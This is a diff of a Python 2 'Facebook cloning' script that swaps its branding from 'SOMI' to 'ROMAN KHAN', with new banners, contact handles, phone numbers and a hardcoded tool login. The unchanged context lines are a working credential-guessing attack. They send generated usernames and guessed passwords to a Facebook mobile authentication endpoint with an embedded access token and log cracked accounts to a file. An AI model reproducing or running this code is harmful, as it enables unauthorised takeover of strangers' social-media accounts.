@@ -81,122 +81,119 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\033[1;91m░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄☆
-\033[1;91m░███████████████████████
-\033[1;91m░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤
-\033[1;91m╬▀░▐▓▓▓▓▓▓▌▀█░░░█▀░
-\033[1;95m▒░░▓▓▓▓▓▓█▄▄▄▄▄█▀╬░
-\033[1;95m░░█▓▓▓▓▓▌░▒▒▒▒▒▒▒▒▒
-\033[1;95m░▐█▓▓▓▓▓░░▒▒▒▒▒▒▒▒▒
-\033[1;95m░▐██████▌╬░▒▒▒▒▒▒▒▒
+██████╗░░█████╗░███╗░░░███╗░█████╗░███╗░░██╗
+██╔══██╗██╔══██╗████╗░████║██╔══██╗████╗░██║
+██████╔╝██║░░██║██╔████╔██║███████║██╔██╗██║
+██╔══██╗██║░░██║██║╚██╔╝██║██╔══██║██║╚████║
+██║░░██║╚█████╔╝██║░╚═╝░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+
+██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+██║░██╔╝██║░░██║██╔══██╗████╗░██║
+█████═╝░███████║███████║██╔██╗██║
+██╔═██╗░██╔══██║██╔══██║██║╚████║
+██║░╚██╗██║░░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝ 
 
 
-\033[1;92m▒█▀▀▀█ ▒█▀▀▀█ ▒█▀▄▀█ ▀█▀ 　 
-\033[1;97m░▀▀▀▄▄ ▒█░░▒█ ▒█▒█▒█ ▒█░ 　 
-\033[1;92m▒█▄▄▄█ ▒█▄▄▄█ ▒█░░▒█ ▄█▄ 　 
-
-\033[1;92m▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▄░▒█ ▒█▀▀▄ 
-\033[1;97m▒█▀▀▄ ▒█▄▄▀ ▒█▄▄█ ▒█▒█▒█ ▒█░▒█ 
-\033[1;92m▒█▄▄█ ▒█░▒█ ▒█░▒█ ▒█░░▀█ ▒█▄▄▀
-
-
-\033[1;92m---------------------BRAND---------------------
+\033[1;92m---------------------ROMAN---------------------
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;96mThe Credit For This Code Goes To Somi..
+\033[1;96mThe Credit For This Code Goes To ROMAN..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;91mDEVOLPER
-                     SOMI BRAND
+                     ROMAN KHAN
 \033[1;94mFACEBOOK
-                     SO MI MUSICAN
+                     ROMAN KTK
 \033[1;91mYOUTUBE
-                     SOMI RAPPER
+                     NONE
 \033[1;93mGITHUB
-                     Somi190
+                     Hassam786
 \033[1;92mWHATAAPP
-                      03455453538
+                      0306-9511798
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;96mBlacklist Life gun mri wife Tour touch Sky..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••                
-\033[1;92m--------------------SOMI----------------------
+\033[1;92m--------------------ROMAN----------------------
 """
 
 ####Logo####
 
 logo1 = """
+██████╗░░█████╗░███╗░░░███╗░█████╗░███╗░░██╗
+██╔══██╗██╔══██╗████╗░████║██╔══██╗████╗░██║
+██████╔╝██║░░██║██╔████╔██║███████║██╔██╗██║
+██╔══██╗██║░░██║██║╚██╔╝██║██╔══██║██║╚████║
+██║░░██║╚█████╔╝██║░╚═╝░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
 
 
-\033[1;91m░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ 　 
-\033[1;97m─▀▀▀▄▄ ─░█── ░█▄▄█ ░█▄▄▀ 　 
-\033[1;91m░█▄▄▄█ ─░█── ░█─░█ ░█─░█ 　 
-
-\033[1;91m░█▀▀█ ░█▀▀▀█ ░█──░█ 
-\033[1;97m░█▀▀▄ ░█──░█ ░█▄▄▄█ 
-\033[1;91m░█▄▄█ ░█▄▄▄█ ──░█── 
-
-\033[1;91m░█▀▀▀█ ░█▀▀▀█ 　 ░█▀▄▀█ ▀█▀ 
-\033[1;97m─▀▀▀▄▄ ░█──░█ 　 ░█░█░█ ░█─ 
-\033[1;91m░█▄▄▄█ ░█▄▄▄█ 　 ░█──░█ ▄█▄
-\033[1;91m
+██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+██║░██╔╝██║░░██║██╔══██╗████╗░██║
+█████═╝░███████║███████║██╔██╗██║
+██╔═██╗░██╔══██║██╔══██║██║╚████║
+██║░╚██╗██║░░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝ 
 
 
-
-\033[1;91m------------------SOMI----------------------
+\033[1;91m------------------ROMAN----------------------
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
-\033[1;96mThe Credit For This Code Goes To Somi..
+\033[1;96mThe Credit For This Code Goes To ROMAN..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;91mDEVOLPER
-                     SOMI BRAND
+                     ROMAN KHAN
 \033[1;94mFACEBOOK
-                     SO MI MUSICAN
+                     ROMAN KTK
 \033[1;91mYOUTUBE
-                     SOMI RAPPER
+                     NONE
 \033[1;93mGITHUB
-                     Somi190
+                     Hassam786
 \033[1;92mWHATAAPP
-                      03455453538
+                      0306-9511798
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;96mBlacklist Life gun mri wife Tour touch Sky..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 
-\033[1;95m-----------------SOMi------------------------
+\033[1;95m-----------------ROMAN------------------------
 """
 logo2 = """
 
-\033[1;91m░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ 　 
-\033[1;97m─▀▀▀▄▄ ─░█── ░█▄▄█ ░█▄▄▀ 　 
-\033[1;91m░█▄▄▄█ ─░█── ░█─░█ ░█─░█ 　 
+██████╗░░█████╗░███╗░░░███╗░█████╗░███╗░░██╗
+██╔══██╗██╔══██╗████╗░████║██╔══██╗████╗░██║
+██████╔╝██║░░██║██╔████╔██║███████║██╔██╗██║
+██╔══██╗██║░░██║██║╚██╔╝██║██╔══██║██║╚████║
+██║░░██║╚█████╔╝██║░╚═╝░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
 
-\033[1;91m░█▀▀█ ░█▀▀▀█ ░█──░█ 
-\033[1;97m░█▀▀▄ ░█──░█ ░█▄▄▄█ 
-\033[1;91m░█▄▄█ ░█▄▄▄█ ──░█── 
 
-\033[1;91m░█▀▀▀█ ░█▀▀▀█ 　 ░█▀▄▀█ ▀█▀ 
-\033[1;97m─▀▀▀▄▄ ░█──░█ 　 ░█░█░█ ░█─ 
-\033[1;91m░█▄▄▄█ ░█▄▄▄█ 　 ░█──░█ ▄█▄
-\033[1;97m
+░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░
+██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗
+██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██████╔╝
+██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██╔══██╗
+╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██║░░██║
+░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
 
-\033[1;91m---------------------SOMI-------------------
+\033[1;91m---------------------ROMAN-------------------
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;96mThe Credit For This Code Goes To Somi..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;91mDEVOLPER
-                     SOMI BRAND
+                     ROMAN KHAN
 \033[1;94mFACEBOOK
-                     SO MI MUSICAN
+                     ROMAN KTK
 \033[1;91mYOUTUBE
-                     SOMI RAPPER
+                     NONE
 \033[1;93mGITHUB
-                     Somi190
+                     Hassam786
 \033[1;92mWHATAAPP
-                      03455453538
+                      0306-9511798
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
 \033[1;96mBlacklist Life gun mri wife Tour touch Sky..
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
                                                 
-\033[1;97m---------------------SOMI--------------------
+\033[1;97m---------------------ROMAN--------------------
 """
-CorrectUsername = "Somi"
-CorrectPassword = "Awan"
+CorrectUsername = "ROMAN"
+CorrectPassword = "KHAN"
 
 loop = 'true'
 while (loop == 'true'):
@@ -242,9 +239,9 @@ def pilih_login():
 def Zeek():
     os.system('clear')
     print logo1
-    print '\x1b[1;91m[1]  START CLONING With SOMI'
+    print '\x1b[1;91m[1]  START CLONING '
     time.sleep(0.10)
-    print '\x1b[1;92m[2] SOMI FB ACCOUNT'
+    print '\x1b[1;92m[2] FB ACCOUNT'
     time.sleep(0.10)
     print '\x1b[1;95m[3] MORE INFO'
     time.sleep(0.10)
@@ -252,7 +249,7 @@ def Zeek():
     time.sleep(0.10)
     print '\x1b[1;97m[5] CLONING ERROR'
     time.sleep(0.10)
-    print '\x1b[1;91m[6] SOMI FACEBOOK'
+    print '\x1b[1;91m[6] FACEBOOK'
     time.sleep(0.10)
     print '\x1b[1;94m[0] back'
    
@@ -304,14 +301,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;93m(FREE)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m(AFTER 7 DAYS) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -321,14 +318,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m(Enjoy)  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;93m(FREE)  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m(AFTER 7 DAYS) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -338,14 +335,14 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass3
+                                print '\x1b[1;93m(FREE)  ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/cloned.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
                                 okb.close()
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;97m(AFTER 7 DAYS) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
@@ -355,14 +352,14 @@ def action():
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass4 
+                                        print '\x1b[1;93m(FREE)  ' + k + c + user + '  |  ' + pass4 
                                         okb = open('save/cloned.txt', 'a')
                                         okb.write(k+c+user+pass4+'\n')
                                         okb.close()
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;97m(AFTER 7 DAYS) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -372,14 +369,14 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass5
+                                                print '\x1b[1;93m(FREE)  ' + k + c + user + '  |  ' + pass5
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass5+'\n')
                                                 okb.close()
                                                 oks.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass5 
+                                                    print '\033[1;97m(AFTER 7 DAYS) ' + k + c + user + '  |  ' + pass5 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
